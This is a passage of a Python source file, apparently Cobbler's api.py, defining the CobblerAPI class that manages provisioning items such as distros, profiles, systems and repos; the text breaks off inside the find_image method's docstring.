"https://github.com/cobbler/cobbler/raw/d8f60bbf14a838c8c8a1dba98086b223e35fe70a/cobbler%2Fapi.py", "code": "\"\"\"\nCopyright 2006-2009, Red Hat, Inc and Others\nMichael DeHaan <michael.dehaan AT gmail>\n\nThis program is free software; you can redistribute it and/or modify\nit under the terms of the GNU General Public License as published by\nthe Free Software Foundation; either version 2 of the License, or\n(at your option) any later version.\n\nThis program is distributed in the hope that it will be useful,\nbut WITHOUT ANY WARRANTY; without even the implied warranty of\nMERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\nGNU General Public License for more details.\n\nYou should have received a copy of the GNU General Public License\nalong with this program; if not, write to the Free Software\nFoundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA\n02110-1301  USA\n\"\"\"\n\nimport logging\nimport os\nimport pathlib\nimport random\nimport tempfile\nimport threading\nfrom configparser import ConfigParser\nfrom pathlib import Path\nfrom typing import Dict, List, Optional, Union\n\nfrom cobbler.actions import status, hardlink, sync, buildiso, replicate, report, log, acl, check, reposync, grubimage\nfrom cobbler import autoinstall_manager, autoinstallgen, download_manager, enums, module_loader, power_manager\nfrom cobbler import settings, tftpgen, utils, yumgen\nfrom cobbler.cobbler_collections import manager\nfrom cobbler.items import distro, file, image, menu, mgmtclass, package, profile, repo, system\n\n# FIXME: add --quiet depending on if not --verbose?\nRSYNC_CMD = \"rsync -a %s '%s' %s --progress\"\n\n\n# notes on locking:\n# - CobblerAPI is a singleton object\n# - The XMLRPC variants allow 1 simultaneous request, therefore we flock on our settings file for now on a request by\n#   request basis.\n\n\nclass CobblerAPI:\n    \"\"\"\n    Python API module for Cobbler.\n    See source for cobbler.py, or pydoc, for example usage.\n    Cli apps and daemons should import api.py, and no other Cobbler code.\n    \"\"\"\n    __shared_state = {}\n    __has_loaded = False\n\n    def __init__(self, is_cobblerd: bool = False, settingsfile_location: str = \"/etc/cobbler/settings.yaml\",\n                 execute_settings_automigration: bool = True):\n        \"\"\"\n        Constructor\n\n        :param is_cobblerd: Wether this API is run as a daemon or not.\n        :param settingsfile_location: The location of the settings file on the disk.\n        \"\"\"\n\n        # FIXME: this should be switchable through some simple system\n\n        self.__dict__ = CobblerAPI.__shared_state\n        self.perms_ok = False\n        if not CobblerAPI.__has_loaded:\n            # NOTE: we do not log all API actions, because a simple CLI invocation may call adds and such to load the\n            # config, which would just fill up the logs, so we'll do that logging at CLI level (and remote.py web\n            # service level) instead.\n\n            random.seed()\n            self.is_cobblerd = is_cobblerd\n            if is_cobblerd:\n                main_thread = threading.main_thread()\n                main_thread.setName(\"Daemon\")\n\n            self.logger = logging.getLogger()\n\n            # FIXME: consolidate into 1 server instance\n\n            self.selinux_enabled = utils.is_selinux_enabled()\n            self.dist, self.os_version = utils.os_release()\n            self._settings = self.__generate_settings(pathlib.Path(settingsfile_location),\n                                                      execute_settings_automigration)\n\n            CobblerAPI.__has_loaded = True\n\n            # load the modules first, or nothing else works...\n            module_loader.load_modules()\n\n            # import signatures\n            try:\n                utils.load_signatures(self.settings().signature_path)\n            except Exception as e:\n                self.log(\"Failed to load signatures from %s: %s\" % (self.settings().signature_path, e))\n                return\n\n            self._collection_mgr = manager.CollectionManager(self)\n            self.deserialize()\n\n            self.log(\"%d breeds and %d OS versions read from the signature file\"\n                     % (len(utils.get_valid_breeds()), len(utils.get_valid_os_versions())))\n\n            self.authn = self.get_module_from_file(\n                \"authentication\",\n                \"module\",\n                \"authn_configfile\"\n            )\n            self.authz = self.get_module_from_file(\n                \"authorization\",\n                \"module\",\n                \"authz_allowall\"\n            )\n\n            # FIXME: pass more loggers around, and also see that those using things via tasks construct their own\n            #  yumgen/tftpgen versus reusing this one, which has the wrong logger (most likely) for background tasks.\n\n            self.autoinstallgen = autoinstallgen.AutoInstallationGen(self._collection_mgr)\n            self.yumgen = yumgen.YumGen(self._collection_mgr)\n            self.tftpgen = tftpgen.TFTPGen(self._collection_mgr)\n            self.power_mgr = power_manager.PowerManager(self, self._collection_mgr)\n            self.logger.debug(\"API handle initialized\")\n            self.perms_ok = True\n\n    def __generate_settings(self, settings_path: Path,\n                            execute_settings_automigration: bool = True) -> settings.Settings:\n        # Read in YAML file and get dict\n        yaml_dict = settings.read_yaml_file(settings_path)\n\n        # Add or update auto migrate settings value\n        yaml_dict[\"auto_migrate_settings\"] = execute_settings_automigration\n\n        # Take dict and use it in migrations\n        migrated_settings = settings.migrate(yaml_dict, settings_path)\n\n        # After the migration is done, save result in the settings object\n        new_settings = settings.Settings()\n        new_settings.from_dict(migrated_settings)\n\n        # save to disk\n        new_settings.save(settings_path)\n\n        # Return object\n        return new_settings\n\n    # ==========================================================\n\n    def is_selinux_enabled(self) -> bool:\n        \"\"\"\n        Returns whether selinux is enabled on the Cobbler server.\n        We check this just once at Cobbler API init time, because a restart is required to change this; this does\n        /not/ check enforce/permissive, nor does it need to.\n        \"\"\"\n        return self.selinux_enabled\n\n    def is_selinux_supported(self) -> bool:\n        \"\"\"\n        Returns whether or not the OS is sufficient enough to run with SELinux enabled (currently EL 5 or later).\n\n        :returns: False per default. If Distro is Redhat and Version >= 5 then it returns true.\n        \"\"\"\n        # FIXME: This detection is flawed. There is more than just Rhel with selinux and the original implementation was\n        #        too broad.\n        if (\"red hat\" in self.dist or \"redhat\" in self.dist) and self.os_version >= 5:\n            return True\n        # doesn't support public_content_t\n        return False\n\n    # ==========================================================\n\n    def last_modified_time(self) -> float:\n        \"\"\"\n        Returns the time of the last modification to Cobbler, made by any API instance, regardless of the serializer\n        type.\n\n        :returns: 0 if there is no file where the information required for this method is saved.\n        \"\"\"\n        # FIXME: This fails in case the file required is not available\n        if not os.path.exists(\"/var/lib/cobbler/.mtime\"):\n            fd = open(\"/var/lib/cobbler/.mtime\", 'w')\n            fd.write(\"0\")\n            fd.close()\n            return float(0)\n        fd = open(\"/var/lib/cobbler/.mtime\", 'r')\n        data = fd.read().strip()\n        return float(data)\n\n    # ==========================================================\n\n    def log(self, msg: str, args=None, debug: bool = False):\n        \"\"\"\n        Logs a message with the already initiated logger of this object.\n\n        :param msg: The message to log.\n        :param args: Optional message which gets appended to the main msg with a ';'.\n        :param debug: Weather the logged message is a debug message (true) or info (false).\n\n        .. deprecated:: 3.3.0\n           We should use the standard logger.\n        \"\"\"\n        if debug:\n            logger = self.logger.debug\n        else:\n            logger = self.logger.info\n        if args is None:\n            logger(\"%s\" % msg)\n        else:\n            logger(\"%s; %s\" % (msg, str(args)))\n\n    # ==========================================================\n\n    def version(self, extended: bool = False) -> Union[float, Dict[str, Union[str, list]]]:\n        \"\"\"\n        What version is Cobbler?\n\n        If extended == False, returns a float for backwards compatibility\n        If extended == True, returns a dict:\n\n            gitstamp      -- the last git commit hash\n            gitdate       -- the last git commit date on the builder machine\n            builddate     -- the time of the build\n            version       -- something like \"1.3.2\"\n            version_tuple -- something like [ 1, 3, 2 ]\n\n        :param extended: False returns a float, True a Dictionary.\n        \"\"\"\n        config = ConfigParser()\n        config.read(\"/etc/cobbler/version\")\n        data: Dict[str, Union[str, list]] = {\n            \"gitdate\": config.get(\"cobbler\", \"gitdate\"),\n            \"gitstamp\": config.get(\"cobbler\", \"gitstamp\"),\n            \"builddate\": config.get(\"cobbler\", \"builddate\"),\n            \"version\": config.get(\"cobbler\", \"version\"),\n            \"version_tuple\": []\n        }\n        # dont actually read the version_tuple from the version file\n        for num in data[\"version\"].split(\".\"):\n            data[\"version_tuple\"].append(int(num))\n\n        if not extended:\n            # for backwards compatibility and use with koan's comparisons\n            elems = data[\"version_tuple\"]\n            return int(elems[0]) + 0.1 * int(elems[1]) + 0.001 * int(elems[2])\n        else:\n            return data\n\n    # ==========================================================\n\n    def get_item(self, what: str, name: str):\n        \"\"\"\n        Get a general item.\n\n        :param what: The item type to retrieve from the internal database.\n        :param name: The name of the item to retrieve.\n        :return: An item of the desired type.\n        \"\"\"\n        # self.log(\"get_item\", [what, name], debug=True)\n        item = self._collection_mgr.get_items(what).get(name)\n        return item\n\n    def get_items(self, what: str):\n        \"\"\"\n        Get all items of a collection.\n\n        :param what: The collection to query.\n        :return: The items which were queried. May return no items.\n        \"\"\"\n        # self.log(\"get_items\", [what], debug=True)\n        items = self._collection_mgr.get_items(what)\n        return items\n\n    def distros(self):\n        \"\"\"\n        Return the current list of distributions\n        \"\"\"\n        return self.get_items(\"distro\")\n\n    def profiles(self):\n        \"\"\"\n        Return the current list of profiles\n        \"\"\"\n        return self.get_items(\"profile\")\n\n    def systems(self):\n        \"\"\"\n        Return the current list of systems\n        \"\"\"\n        return self.get_items(\"system\")\n\n    def repos(self):\n        \"\"\"\n        Return the current list of repos\n        \"\"\"\n        return self.get_items(\"repo\")\n\n    def images(self):\n        \"\"\"\n        Return the current list of images\n        \"\"\"\n        return self.get_items(\"image\")\n\n    def settings(self):\n        \"\"\"\n        Return the application configuration\n        \"\"\"\n        return self._settings\n\n    def mgmtclasses(self):\n        \"\"\"\n        Return the current list of mgmtclasses\n        \"\"\"\n        return self.get_items(\"mgmtclass\")\n\n    def packages(self):\n        \"\"\"\n        Return the current list of packages\n        \"\"\"\n        return self.get_items(\"package\")\n\n    def files(self):\n        \"\"\"\n        Return the current list of files\n        \"\"\"\n        return self.get_items(\"file\")\n\n    def menus(self):\n        \"\"\"\n        Return the current list of menus\n        \"\"\"\n        return self.get_items(\"menu\")\n\n    # =======================================================================\n\n    def copy_item(self, what: str, ref, newname: str):\n        \"\"\"\n        General copy method which is called by the specific methods.\n\n        :param what: The collection type which gets copied.\n        :param ref: The object itself which gets copied.\n        :param newname: The new name of the newly created object.\n        \"\"\"\n        self.log(\"copy_item(%s)\" % what, [ref.name, newname])\n        self.get_items(what).copy(ref, newname)\n\n    def copy_distro(self, ref, newname: str):\n        \"\"\"\n        This method copies a distro which is just different in the name of the object.\n\n        :param ref: The object itself which gets copied.\n        :param newname: The new name of the newly created object.\n        \"\"\"\n        self.copy_item(\"distro\", ref, newname)\n\n    def copy_profile(self, ref, newname: str):\n        \"\"\"\n        This method copies a profile which is just different in the name of the object.\n\n        :param ref: The object itself which gets copied.\n        :param newname: The new name of the newly created object.\n        \"\"\"\n        self.copy_item(\"profile\", ref, newname)\n\n    def copy_system(self, ref, newname: str):\n        \"\"\"\n        This method copies a system which is just different in the name of the object.\n\n        :param ref: The object itself which gets copied.\n        :param newname: The new name of the newly created object.\n        \"\"\"\n        self.copy_item(\"system\", ref, newname)\n\n    def copy_repo(self, ref, newname: str):\n        \"\"\"\n        This method copies a repository which is just different in the name of the object.\n\n        :param ref: The object itself which gets copied.\n        :param newname: The new name of the newly created object.\n        \"\"\"\n        self.copy_item(\"repo\", ref, newname)\n\n    def copy_image(self, ref, newname: str):\n        \"\"\"\n        This method copies an image which is just different in the name of the object.\n\n        :param ref: The object itself which gets copied.\n        :param newname: The new name of the newly created object.\n        \"\"\"\n        self.copy_item(\"image\", ref, newname)\n\n    def copy_mgmtclass(self, ref, newname: str):\n        \"\"\"\n        This method copies a management class which is just different in the name of the object.\n\n        :param ref: The object itself which gets copied.\n        :param newname: The new name of the newly created object.\n        \"\"\"\n        self.copy_item(\"mgmtclass\", ref, newname)\n\n    def copy_package(self, ref, newname: str):\n        \"\"\"\n        This method copies a package which is just different in the name of the object.\n\n        :param ref: The object itself which gets copied.\n        :param newname: The new name of the newly created object.\n        \"\"\"\n        self.copy_item(\"package\", ref, newname)\n\n    def copy_file(self, ref, newname: str):\n        \"\"\"\n        This method copies a file which is just different in the name of the object.\n\n        :param ref: The object itself which gets copied.\n        :param newname: The new name of the newly created object.\n        \"\"\"\n        self.copy_item(\"file\", ref, newname)\n\n    def copy_menu(self, ref, newname: str):\n        \"\"\"\n        This method copies a file which is just different in the name of the object.\n\n        :param ref: The object itself which gets copied.\n        :param newname: The new name of the newly created object.\n        \"\"\"\n        self.copy_item(\"menu\", ref, newname)\n\n    # ==========================================================================\n\n    def remove_item(self, what: str, ref, recursive: bool = False, delete: bool = True, with_triggers: bool = True):\n        \"\"\"\n        Remove a general item. This method should not be used by an external api. Please use the specific\n        remove_<itemtype> methods.\n\n        :param what: The type of the item.\n        :param ref: The internal unique handle for the item.\n        :param recursive: If the item should recursively should delete dependencies on itself.\n        :param delete: Not known what this parameter does exactly.\n        :param with_triggers: Whether you would like to have the removal triggers executed or not.\n        \"\"\"\n        if isinstance(what, str):\n            if isinstance(ref, str):\n                ref = self.get_item(what, ref)\n                if ref is None:\n                    return  # nothing to remove\n        self.log(\"remove_item(%s)\" % what, [ref.name])\n        self.get_items(what).remove(ref.name, recursive=recursive, with_delete=delete, with_triggers=with_triggers)\n\n    def remove_distro(self, ref, recursive: bool = False, delete: bool = True, with_triggers: bool = True):\n        \"\"\"\n        Remove a distribution from Cobbler.\n\n        :param ref: The internal unique handle for the item.\n        :param recursive: If the item should recursively should delete dependencies on itself.\n        :param delete: Not known what this parameter does exactly.\n        :param with_triggers: Whether you would like to have the removal triggers executed or not.\n        \"\"\"\n        self.remove_item(\"distro\", ref, recursive=recursive, delete=delete, with_triggers=with_triggers)\n\n    def remove_profile(self, ref, recursive: bool = False, delete: bool = True, with_triggers: bool = True):\n        \"\"\"\n        Remove a profile from Cobbler.\n\n        :param ref: The internal unique handle for the item.\n        :param recursive: If the item should recursively should delete dependencies on itself.\n        :param delete: Not known what this parameter does exactly.\n        :param with_triggers: Whether you would like to have the removal triggers executed or not.\n        \"\"\"\n        self.remove_item(\"profile\", ref, recursive=recursive, delete=delete, with_triggers=with_triggers)\n\n    def remove_system(self, ref, recursive: bool = False, delete: bool = True, with_triggers: bool = True):\n        \"\"\"\n        Remove a system from Cobbler.\n\n        :param ref: The internal unique handle for the item.\n        :param recursive: If the item should recursively should delete dependencies on itself.\n        :param delete: Not known what this parameter does exactly.\n        :param with_triggers: Whether you would like to have the removal triggers executed or not.\n        \"\"\"\n        self.remove_item(\"system\", ref, recursive=recursive, delete=delete, with_triggers=with_triggers)\n\n    def remove_repo(self, ref, recursive: bool = False, delete: bool = True, with_triggers: bool = True):\n        \"\"\"\n        Remove a repository from Cobbler.\n\n        :param ref: The internal unique handle for the item.\n        :param recursive: If the item should recursively should delete dependencies on itself.\n        :param delete: Not known what this parameter does exactly.\n        :param with_triggers: Whether you would like to have the removal triggers executed or not.\n        \"\"\"\n        self.remove_item(\"repo\", ref, recursive=recursive, delete=delete, with_triggers=with_triggers)\n\n    def remove_image(self, ref, recursive: bool = False, delete: bool = True, with_triggers: bool = True):\n        \"\"\"\n        Remove a image from Cobbler.\n\n        :param ref: The internal unique handle for the item.\n        :param recursive: If the item should recursively should delete dependencies on itself.\n        :param delete: Not known what this parameter does exactly.\n        :param with_triggers: Whether you would like to have the removal triggers executed or not.\n        \"\"\"\n        self.remove_item(\"image\", ref, recursive=recursive, delete=delete, with_triggers=with_triggers)\n\n    def remove_mgmtclass(self, ref, recursive: bool = False, delete: bool = True, with_triggers: bool = True):\n        \"\"\"\n        Remove a management class from Cobbler.\n\n        :param ref: The internal unique handle for the item.\n        :param recursive: If the item should recursively should delete dependencies on itself.\n        :param delete: Not known what this parameter does exactly.\n        :param with_triggers: Whether you would like to have the removal triggers executed or not.\n        \"\"\"\n        self.remove_item(\"mgmtclass\", ref, recursive=recursive, delete=delete, with_triggers=with_triggers)\n\n    def remove_package(self, ref, recursive: bool = False, delete: bool = True, with_triggers: bool = True):\n        \"\"\"\n        Remove a package from Cobbler.\n\n        :param ref: The internal unique handle for the item.\n        :param recursive: If the item should recursively should delete dependencies on itself.\n        :param delete: Not known what this parameter does exactly.\n        :param with_triggers: Whether you would like to have the removal triggers executed or not.\n        \"\"\"\n        self.remove_item(\"package\", ref, recursive=recursive, delete=delete, with_triggers=with_triggers)\n\n    def remove_file(self, ref, recursive: bool = False, delete: bool = True, with_triggers: bool = True):\n        \"\"\"\n        Remove a file from Cobbler.\n\n        :param ref: The internal unique handle for the item.\n        :param recursive: If the item should recursively should delete dependencies on itself.\n        :param delete: Not known what this parameter does exactly.\n        :param with_triggers: Whether you would like to have the removal triggers executed or not.\n        \"\"\"\n        self.remove_item(\"file\", ref, recursive=recursive, delete=delete, with_triggers=with_triggers)\n\n    def remove_menu(self, ref, recursive=False, delete=True, with_triggers=True):\n        \"\"\"\n        Remove a menu from Cobbler.\n\n        :param ref: The internal unique handle for the item.\n        :param recursive: If the item should recursively should delete dependencies on itself.\n        :param delete: Not known what this parameter does exactly.\n        :param with_triggers: Whether you would like to have the removal triggers executed or not.\n        \"\"\"\n        self.remove_item(\"menu\", ref, recursive=recursive, delete=delete, with_triggers=with_triggers)\n\n    # ==========================================================================\n\n    def rename_item(self, what: str, ref, newname: str):\n        \"\"\"\n        Remove a general item. This method should not be used by an external api. Please use the specific\n        rename_<itemtype> methods.\n\n        :param what: The type of object which should be renamed.\n        :param ref: The internal unique handle for the item.\n        :param newname: The new name for the item.\n        \"\"\"\n        self.log(\"rename_item(%s)\" % what, [ref.name, newname])\n        self.get_items(what).rename(ref, newname)\n\n    def rename_distro(self, ref, newname: str):\n        \"\"\"\n        Rename a distro to a new name.\n\n        :param ref: The internal unique handle for the item.\n        :param newname: The new name for the item.\n        \"\"\"\n        self.rename_item(\"distro\", ref, newname)\n\n    def rename_profile(self, ref, newname: str):\n        \"\"\"\n        Rename a profile to a new name.\n\n        :param ref: The internal unique handle for the item.\n        :param newname: The new name for the item.\n        \"\"\"\n        self.rename_item(\"profile\", ref, newname)\n\n    def rename_system(self, ref, newname: str):\n        \"\"\"\n        Rename a system to a new name.\n\n        :param ref: The internal unique handle for the item.\n        :param newname: The new name for the item.\n        \"\"\"\n        self.rename_item(\"system\", ref, newname)\n\n    def rename_repo(self, ref, newname: str):\n        \"\"\"\n        Rename a repository to a new name.\n\n        :param ref: The internal unique handle for the item.\n        :param newname: The new name for the item.\n        \"\"\"\n        self.rename_item(\"repo\", ref, newname)\n\n    def rename_image(self, ref, newname: str):\n        \"\"\"\n        Rename an image to a new name.\n\n        :param ref: The internal unique handle for the item.\n        :param newname: The new name for the item.\n        \"\"\"\n        self.rename_item(\"image\", ref, newname)\n\n    def rename_mgmtclass(self, ref, newname: str):\n        \"\"\"\n        Rename a management class to a new name.\n\n        :param ref: The internal unique handle for the item.\n        :param newname: The new name for the item.\n        \"\"\"\n        self.rename_item(\"mgmtclass\", ref, newname)\n\n    def rename_package(self, ref, newname: str):\n        \"\"\"\n        Rename a package to a new name.\n\n        :param ref: The internal unique handle for the item.\n        :param newname: The new name for the item.\n        \"\"\"\n        self.rename_item(\"package\", ref, newname)\n\n    def rename_file(self, ref, newname: str):\n        \"\"\"\n        Rename a file to a new name.\n\n        :param ref: The internal unique handle for the item.\n        :param newname: The new name for the item.\n        \"\"\"\n        self.rename_item(\"file\", ref, newname)\n\n    def rename_menu(self, ref, newname: str):\n        \"\"\"\n        Rename a menu to a new name.\n\n        :param ref: The internal unique handle for the item.\n        :param newname: The new name for the item.\n        \"\"\"\n        self.rename_item(\"menu\", ref, newname)\n\n    # ==========================================================================\n\n    # FIXME: add a new_item method\n\n    def new_distro(self, is_subobject: bool = False):\n        \"\"\"\n        Returns a new empty distro object. This distro is not automatically persisted. Persistance is achieved via\n        ``save()``.\n\n        :param is_subobject: If the object created is a subobject or not.\n        :return: An empty Distro object.\n        \"\"\"\n        self.log(\"new_distro\", [is_subobject])\n        return distro.Distro(self._collection_mgr, is_subobject=is_subobject)\n\n    def new_profile(self, is_subobject: bool = False):\n        \"\"\"\n        Returns a new empty profile object. This profile is not automatically persisted. Persistence is achieved via\n        ``save()``.\n\n        :param is_subobject: If the object created is a subobject or not.\n        :return: An empty Profile object.\n        \"\"\"\n        self.log(\"new_profile\", [is_subobject])\n        return profile.Profile(self._collection_mgr, is_subobject=is_subobject)\n\n    def new_system(self, is_subobject: bool = False):\n        \"\"\"\n        Returns a new empty system object. This system is not automatically persisted. Persistence is achieved via\n        ``save()``.\n\n        :param is_subobject: If the object created is a subobject or not.\n        :return: An empty System object.\n        \"\"\"\n        self.log(\"new_system\", [is_subobject])\n        return system.System(self._collection_mgr, is_subobject=is_subobject)\n\n    def new_repo(self, is_subobject: bool = False):\n        \"\"\"\n        Returns a new empty repo object. This repository is not automatically persisted. Persistence is achieved via\n        ``save()``.\n\n        :param is_subobject: If the object created is a subobject or not.\n        :return: An empty repo object.\n        \"\"\"\n        self.log(\"new_repo\", [is_subobject])\n        return repo.Repo(self._collection_mgr, is_subobject=is_subobject)\n\n    def new_image(self, is_subobject: bool = False):\n        \"\"\"\n        Returns a new empty image object. This image is not automatically persisted. Persistence is achieved via\n        ``save()``.\n\n        :param is_subobject: If the object created is a subobject or not.\n        :return: An empty image object.\n        \"\"\"\n        self.log(\"new_image\", [is_subobject])\n        return image.Image(self._collection_mgr, is_subobject=is_subobject)\n\n    def new_mgmtclass(self, is_subobject: bool = False):\n        \"\"\"\n        Returns a new empty mgmtclass object. This mgmtclass is not automatically persisted. Persistence is achieved via\n        ``save()``.\n\n        :param is_subobject: If the object created is a subobject or not.\n        :return: An empty mgmtclass object.\n        \"\"\"\n        self.log(\"new_mgmtclass\", [is_subobject])\n        return mgmtclass.Mgmtclass(self._collection_mgr, is_subobject=is_subobject)\n\n    def new_package(self, is_subobject: bool = False):\n        \"\"\"\n        Returns a new empty package object. This package is not automatically persisted. Persistence is achieved via\n        ``save()``.\n\n        :param is_subobject: If the object created is a subobject or not.\n        :return: An empty Package object.\n        \"\"\"\n        self.log(\"new_package\", [is_subobject])\n        return package.Package(self._collection_mgr, is_subobject=is_subobject)\n\n    def new_file(self, is_subobject: bool = False):\n        \"\"\"\n        Returns a new empty file object. This file is not automatically persisted. Persistence is achieved via\n        ``save()``.\n\n        :param is_subobject: If the object created is a subobject or not.\n        :return: An empty File object.\n        \"\"\"\n        self.log(\"new_file\", [is_subobject])\n        return file.File(self._collection_mgr, is_subobject=is_subobject)\n\n    def new_menu(self, is_subobject: bool = False):\n        \"\"\"\n        Returns a new empty menu object. This file is not automatically persisted. Persistence is achieved via\n        ``save()``.\n\n        :param is_subobject: If the object created is a subobject or not.\n        :return: An empty File object.\n        \"\"\"\n        self.log(\"new_menu\", [is_subobject])\n        return menu.Menu(self._collection_mgr, is_subobject=is_subobject)\n\n    # ==========================================================================\n\n    def add_item(self, what: str, ref, check_for_duplicate_names: bool = False, save: bool = True):\n        \"\"\"\n        Add an abstract item to a collection of its specific items. This is not meant for external use. Please reefer\n        to one of the specific methods ``add_<type>``.\n\n        :param what: The item type.\n        :param ref: The identifier for the object to add to a collection.\n        :param check_for_duplicate_names: If the name should be unique or can be present multiple times.\n        :param save: If the item should be persisted.\n        \"\"\"\n        self.log(\"add_item(%s)\" % what, [ref.name])\n        self.get_items(what).add(ref, check_for_duplicate_names=check_for_duplicate_names, save=save)\n\n    def add_distro(self, ref, check_for_duplicate_names: bool = False, save: bool = True):\n        \"\"\"\n        Add a distribution to Cobbler.\n\n        :param ref: The identifier for the object to add to a collection.\n        :param check_for_duplicate_names: If the name should be unique or can be present multiple times.\n        :param save: If the item should be persisted.\n        \"\"\"\n        self.add_item(\"distro\", ref, check_for_duplicate_names=check_for_duplicate_names, save=save)\n\n    def add_profile(self, ref, check_for_duplicate_names: bool = False, save: bool = True):\n        \"\"\"\n        Add a profile to Cobbler.\n\n        :param ref: The identifier for the object to add to a collection.\n        :param check_for_duplicate_names: If the name should be unique or can be present multiple times.\n        :param save: If the item should be persisted.\n        \"\"\"\n        self.add_item(\"profile\", ref, check_for_duplicate_names=check_for_duplicate_names, save=save)\n\n    def add_system(self, ref, check_for_duplicate_names: bool = False, check_for_duplicate_netinfo=False,\n                   save: bool = True):\n        \"\"\"\n        Add a system to Cobbler.\n\n        :param ref: The identifier for the object to add to a collection.\n        :param check_for_duplicate_names: If the name should be unique or can be present multiple times.\n        :param check_for_duplicate_netinfo: If the name of the network interface should be unique or can be present\n                                            multiple times.\n        :param save: If the item should be persisted.\n        \"\"\"\n        self.add_item(\"system\", ref, check_for_duplicate_names=check_for_duplicate_names, save=save)\n\n    def add_repo(self, ref, check_for_duplicate_names: bool = False, save: bool = True):\n        \"\"\"\n        Add a repository to Cobbler.\n\n        :param ref: The identifier for the object to add to a collection.\n        :param check_for_duplicate_names: If the name should be unique or can be present multiple times.\n        :param save: If the item should be persisted.\n        \"\"\"\n        self.add_item(\"repo\", ref, check_for_duplicate_names=check_for_duplicate_names, save=save)\n\n    def add_image(self, ref, check_for_duplicate_names: bool = False, save: bool = True):\n        \"\"\"\n        Add an image to Cobbler.\n\n        :param ref: The identifier for the object to add to a collection.\n        :param check_for_duplicate_names: If the name should be unique or can be present multiple times.\n        :param save: If the item should be persisted.\n        \"\"\"\n        self.add_item(\"image\", ref, check_for_duplicate_names=check_for_duplicate_names, save=save)\n\n    def add_mgmtclass(self, ref, check_for_duplicate_names: bool = False, save: bool = True):\n        \"\"\"\n        Add a management class to Cobbler.\n\n        :param ref: The identifier for the object to add to a collection.\n        :param check_for_duplicate_names: If the name should be unique or can be present multiple times.\n        :param save: If the item should be persisted.\n        \"\"\"\n        self.add_item(\"mgmtclass\", ref, check_for_duplicate_names=check_for_duplicate_names, save=save)\n\n    def add_package(self, ref, check_for_duplicate_names: bool = False, save: bool = True):\n        \"\"\"\n        Add a package to Cobbler.\n\n        :param ref: The identifier for the object to add to a collection.\n        :param check_for_duplicate_names: If the name should be unique or can be present multiple times.\n        :param save: If the item should be persisted.\n        \"\"\"\n        self.add_item(\"package\", ref, check_for_duplicate_names=check_for_duplicate_names, save=save)\n\n    def add_file(self, ref, check_for_duplicate_names: bool = False, save: bool = True):\n        \"\"\"\n        Add a file to Cobbler.\n\n        :param ref: The identifier for the object to add to a collection.\n        :param check_for_duplicate_names: If the name should be unique or can be present multiple times.\n        :param save: If the item should be persisted.\n        \"\"\"\n        self.add_item(\"file\", ref, check_for_duplicate_names=check_for_duplicate_names, save=save)\n\n    def add_menu(self, ref, check_for_duplicate_names=False, save=True):\n        \"\"\"\n        Add a submenu to Cobbler.\n\n        :param ref: The identifier for the object to add to a collection.\n        :param check_for_duplicate_names: If the name should be unique or can be present multiple times.\n        :param save: If the item should be persisted.\n        \"\"\"\n        self.add_item(\"menu\", ref, check_for_duplicate_names=check_for_duplicate_names, save=save)\n\n    # ==========================================================================\n\n    def find_items(self, what: str, criteria: dict = None, name: str = \"\", return_list: bool = True,\n                   no_errors: bool = False):\n        \"\"\"\n        This is the abstract base method for finding object int the api. It should not be used by external resources.\n        Please reefer to the specific implementations of this method called ``find_<object type>``.\n\n        :param what: The object type of the item to search for.\n        :param criteria: The dictionary with the key-value pairs to find objects with.\n        :param name: The name of the object.\n        :param return_list: If only the first result or all results should be returned.\n        :param no_errors: Silence some errors which would raise if this turned to False.\n        :return: The list of items witch match the search criteria.\n        \"\"\"\n        # self.log(\"find_items\", [what])\n        if criteria is None:\n            criteria = {}\n\n        if what == \"\" and (\"name\" in criteria or name is not None):\n            return self.__find_by_name(criteria.get(\"name\", name))\n\n        if what not in [\"distro\", \"profile\", \"system\", \"repo\", \"image\", \"mgmtclass\", \"package\", \"file\", \"menu\"]:\n            raise ValueError(\"what needs to be a valid collection!\")\n\n        items = self._collection_mgr.get_items(what)\n        return items.find(name=name, return_list=return_list, no_errors=no_errors, **criteria)\n\n    def __find_by_name(self, name: str):\n        \"\"\"\n        This is a magic method which just searches all collections for the specified name directly,\n        :param name: The name of the item(s).\n        :return: The found item or None.\n        \"\"\"\n        if not isinstance(name, str):\n            raise TypeError(\"name of an object must be of type str!\")\n        collections = [\"distro\", \"profile\", \"system\", \"repo\", \"image\", \"mgmtclass\", \"package\", \"file\", \"menu\"]\n        for collection_name in collections:\n            match = self.find_items(collection_name, name=name, return_list=False)\n            if match is not None:\n                return match\n        return None\n\n    def find_distro(self, name: str = \"\", return_list=False, no_errors=False, **kargs):\n        \"\"\"\n        Find a distribution via a name or keys specified in the ``**kargs``.\n\n        :param name: The name to search for.\n        :param return_list: If only the first result or all results should be returned.\n        :param no_errors: Silence some errors which would raise if this turned to False.\n        :param kargs: Additional key-value pairs which may help in finding the desired objects.\n        :return: A single object or a list of all search results.\n        \"\"\"\n        return self._collection_mgr.distros().find(name=name, return_list=return_list, no_errors=no_errors, **kargs)\n\n    def find_profile(self, name: str = \"\", return_list=False, no_errors=False, **kargs):\n        \"\"\"\n        Find a profile via a name or keys specified in the ``**kargs``.\n\n        :param name: The name to search for.\n        :param return_list: If only the first result or all results should be returned.\n        :param no_errors: Silence some errors which would raise if this turned to False.\n        :param kargs: Additional key-value pairs which may help in finding the desired objects.\n        :return: A single object or a list of all search results.\n        \"\"\"\n        return self._collection_mgr.profiles().find(name=name, return_list=return_list, no_errors=no_errors, **kargs)\n\n    def find_system(self, name: str = \"\", return_list=False, no_errors=False, **kargs):\n        \"\"\"\n        Find a system via a name or keys specified in the ``**kargs``.\n\n        :param name: The name to search for.\n        :param return_list: If only the first result or all results should be returned.\n        :param no_errors: Silence some errors which would raise if this turned to False.\n        :param kargs: Additional key-value pairs which may help in finding the desired objects.\n        :return: A single object or a list of all search results.\n        \"\"\"\n        return self._collection_mgr.systems().find(name=name, return_list=return_list, no_errors=no_errors, **kargs)\n\n    def find_repo(self, name: str = \"\", return_list=False, no_errors=False, **kargs):\n        \"\"\"\n        Find a repository via a name or keys specified in the ``**kargs``.\n\n        :param name: The name to search for.\n        :param return_list: If only the first result or all results should be returned.\n        :param no_errors: Silence some errors which would raise if this turned to False.\n        :param kargs: Additional key-value pairs which may help in finding the desired objects.\n        :return: A single object or a list of all search results.\n        \"\"\"\n        return self._collection_mgr.repos().find(name=name, return_list=return_list, no_errors=no_errors, **kargs)\n\n    def find_image(self, name: str = \"\", return_list=False, no_errors=False, **kargs):\n        \"\"\"\n        Find an image via a name or keys specified in the ``**kargs``.\n\n     